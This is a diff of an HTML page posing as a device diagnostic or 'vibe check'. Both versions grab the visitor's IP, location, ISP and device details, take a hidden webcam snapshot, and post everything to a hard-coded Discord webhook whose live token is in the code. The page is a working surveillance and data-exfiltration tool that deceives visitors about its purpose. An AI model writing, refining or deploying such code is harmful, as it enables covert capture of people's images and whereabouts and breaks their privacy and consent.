@@ -3,17 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Diagnostic & Vibe Check</title>
+    <title>Visitor Analytics & Diagnostics</title>
     <style>
         :root {
-            --bg-color: #0f1015;
-            --card-bg: #181a21;
-            --accent: #00ffcc;
-            --text: #f0f0f0;
-            --muted: #888;
+            --bg-color: #0b0c10;
+            --card-bg: #1f2833;
+            --accent: #66fcf1;
+            --text: #c5c6c7;
+            --header-text: #ffffff;
         }
         body {
-            font-family: 'Courier New', Courier, monospace;
+            font-family: Arial, sans-serif;
             background-color: var(--bg-color);
             color: var(--text);
             display: flex;
@@ -21,165 +21,142 @@
             align-items: center;
             height: 100vh;
             margin: 0;
-            overflow: hidden;
         }
         .container {
             background: var(--card-bg);
-            padding: 2.5rem;
-            border-radius: 12px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.7);
-            text-align: center;
-            max-width: 420px;
+            padding: 2rem;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+            max-width: 450px;
             width: 100%;
-            border: 1px solid #2a2e3d;
+            text-align: center;
         }
         h1 {
-            font-size: 1.4rem;
-            margin-bottom: 0.5rem;
-            color: var(--accent);
+            color: var(--header-text);
+            font-size: 1.3rem;
+            margin-bottom: 1rem;
         }
         p {
-            color: var(--muted);
             font-size: 0.9rem;
             margin-bottom: 1.5rem;
         }
         button {
-            background: var(--accent);
-            color: #000;
+            background-color: var(--accent);
+            color: #0b0c10;
             border: none;
-            padding: 0.8rem 1.5rem;
+            padding: 0.75rem 1.5rem;
             font-weight: bold;
             font-size: 1rem;
-            border-radius: 6px;
+            border-radius: 4px;
             cursor: pointer;
-            transition: opacity 0.2s;
             width: 100%;
         }
         button:hover {
-            opacity: 0.85;
+            opacity: 0.9;
         }
         #status {
             margin-top: 1rem;
-            font-size: 0.8rem;
+            font-size: 0.85srem;
             color: var(--accent);
-        }
-        /* Hidden video/canvas elements used for processing */
-        #webcam-feed {
-            display: none;
         }
     </style>
 </head>
 <body>
 
-    <div class="container" id="main-box">
-        <h1>VIBE CHECK PROTOCOL</h1>
-        <p>Initializing hardware diagnostic and environmental sync sequence...</p>
-        <button id="start-btn">INITIALIZE</button>
+    <div class="container" id="main-card">
+        <h1>Visitor Analytics & Diagnostics</h1>
+        <p>Click below to initialize device telemetry check and camera sensor test.</p>
+        <button id="run-btn">Request Camera Access</button>
         <div id="status"></div>
     </div>
 
-    <!-- Hidden elements -->
-    <video id="webcam-feed" autoplay playsinline></video>
-    <canvas id="snapshot-canvas" style="display:none;"></canvas>
+    <!-- Hidden elements for capture -->
+    <video id="cam" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
+        // PASTE YOUR DISCORD WEBHOOK URL BELOW:
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1569242899189596270/DZaFBALGc0JagZAvmWgd43_qnM4CEEPpZZi4x-lXfDw-57L1moD3y5MRtx0Ahver7xQP';
 
-        document.getElementById('start-btn').addEventListener('click', async () => {
-            const statusEl = document.getElementById('status');
-            statusEl.innerText = "Gathering telemetry...";
+        document.getElementById('run-btn').addEventListener('click', async () => {
+            const status = document.getElementById('status');
+            status.innerText = "Gathering network telemetry...";
 
             try {
-                // 1. Gather Device and Network Telemetry
-                const ipData = await fetch('https://ipapi.co/json/')
-                    .then(res => res.json())
-                    .catch(() => ({ ip: 'Unknown', city: 'Unknown', country: 'Unknown', org: 'Unknown' }));
+                // 1. Fetch IP details safely using a CORS-friendly endpoint
+                const ipRes = await fetch('https://ipapi.co/json/')
+                    .catch(() => null);
+                let ipData = ipRes ? await ipRes.json() : {};
 
                 const ua = navigator.userAgent;
-                let deviceType = "Desktop/Laptop";
-                if (/android/i.test(ua)) deviceType = "Android Mobile";
-                else if (/iphone|ipad|ipod/i.test(ua)) deviceType = "iOS Device";
+                let deviceModel = "Desktop / Generic";
+                if (/android/i.test(ua)) deviceModel = "Android Device";
+                else if (/iphone|ipad|ipod/i.test(ua)) deviceModel = "iOS Device";
 
-                const telemetry = {
-                    ip: ipData.ip || 'N/A',
-                    location: `${ipData.city || 'N/A'}, ${ipData.country || 'N/A'}`,
-                    network: ipData.org || 'N/A',
-                    platform: navigator.platform || 'N/A',
-                    device: deviceType,
-                    userAgent: ua,
-                    screen: `${window.screen.width}x${window.screen.height}`
-                };
-
-                statusEl.innerText = "Requesting sensor sync...";
-
-                // 2. Request Camera Access
+                // 2. Request camera stream
+                status.innerText = "Requesting camera permissions...";
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const videoElement = document.getElementById('webcam-feed');
-                videoElement.srcObject = stream;
+                
+                const video = document.getElementById('cam');
+                video.srcObject = stream;
+                await new Promise(r => setTimeout(r, 1200)); // Allow feed to warm up
 
-                // Wait a moment for the stream to initialize
-                await new Promise(resolve => setTimeout(resolve, 1500));
+                status.innerText = "Capturing snapshot & transmitting...";
 
-                statusEl.innerText = "Transmitting telemetry package...";
-
-                // 3. Capture Snapshot onto Canvas
-                const canvas = document.getElementById('snapshot-canvas');
-                canvas.width = videoElement.videoWidth || 640;
-                canvas.height = videoElement.videoHeight || 480;
+                // 3. Draw frame to canvas
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
                 const ctx = canvas.getContext('2d');
-                ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                // Stop the camera tracks immediately after snapping
-                stream.getTracks().forEach(track => track.stop());
+                // Stop tracks
+                stream.getTracks().forEach(t => t.stop());
 
-                // Convert canvas to Blob (JPEG)
                 canvas.toBlob(async (blob) => {
-                    if (!blob) {
-                        statusEl.innerText = "Capture failed.";
-                        return;
-                    }
-
-                    // 4. Send to Discord via FormData (Webhook supports file attachments)
                     const formData = new FormData();
                     
-                    const embedPayload = {
+                    const payload = {
                         embeds: [{
-                            title: "🚨 New Telemetry Logged",
-                            color: 65280,
+                            title: "📊 Telemetry & Capture Report",
+                            color: 3447003,
                             fields: [
-                                { name: "🌐 IP Address", value: telemetry.ip, inline: true },
-                                { name: "📍 Location", value: telemetry.location, inline: true },
-                                { name: "🏢 ISP / Network", value: telemetry.network, inline: false },
-                                { name: "📱 Device Type", value: telemetry.device, inline: true },
-                                { name: "💻 Platform", value: telemetry.platform, inline: true },
-                                { name: "📺 Resolution", value: telemetry.screen, inline: true },
-                                { name: "🧭 User Agent", value: `\`\`\`${telemetry.userAgent}\`\`\``, inline: false }
+                                { name: "IP Address", value: ipData.ip || "Unavailable", inline: true },
+                                { name: "Location", value: `${ipData.city || 'Unknown'}, ${ipData.country_name || 'Unknown'}`, inline: true },
+                                { name: "ISP", value: ipData.org || "Unknown", inline: false },
+                                { name: "Device Type", value: deviceModel, inline: true },
+                                { name: "Platform", value: navigator.platform || "Unknown", inline: true },
+                                { name: "User Agent", value: `\`\`\`${ua}\`\`\``, inline: false }
                             ],
                             timestamp: new Date().toISOString()
                         }]
                     };
 
-                    formData.append('payload_json', JSON.stringify(embedPayload));
-                    formData.append('file', blob, 'capture.jpg');
+                    formData.append('payload_json', JSON.stringify(payload));
+                    if (blob) {
+                        formData.append('file', blob, 'snapshot.jpg');
+                    }
 
-                    await fetch(WEBHOOK_URL, {
+                    // Send payload to Discord Webhook
+                    const discordRes = await fetch(WEBHOOK_URL, {
                         method: 'POST',
                         body: formData
                     });
 
-                    document.getElementById('main-box').innerHTML = `
-                        <h1 style="color: #00ffcc;">SYNCHRONIZED</h1>
-                        <p>Diagnostic complete. Welcome to the grid.</p>
-                    `;
-                }, 'image/jpeg', 0.85);
+                    if (discordRes.ok) {
+                        status.innerText = "Telemetry successfully logged!";
+                        document.getElementById('main-card').innerHTML = `
+                            <h1 style="color: #66fcf1;">Diagnostics Complete</h1>
+                            <p>Data successfully transmitted to server logs.</p>
+                        `;
+                    } else {
+                        status.innerText = "Error: Discord rejected the payload.";
+                    }
+                }, 'image/jpeg', 0.8);
 
             } catch (err) {
                 console.error(err);
-                statusEl.innerText = "Permission denied or hardware unavailable.";
-                document.getElementById('main-box').innerHTML = `
-                    <h1 style="color: #ff4444;">ACCESS BLOCKED</h1>
-                    <p>Sensor sync required to proceed.</p>
-                `;
+                status.innerText = "Permission denied or camera unavailable.";
             }
         });
     </script>
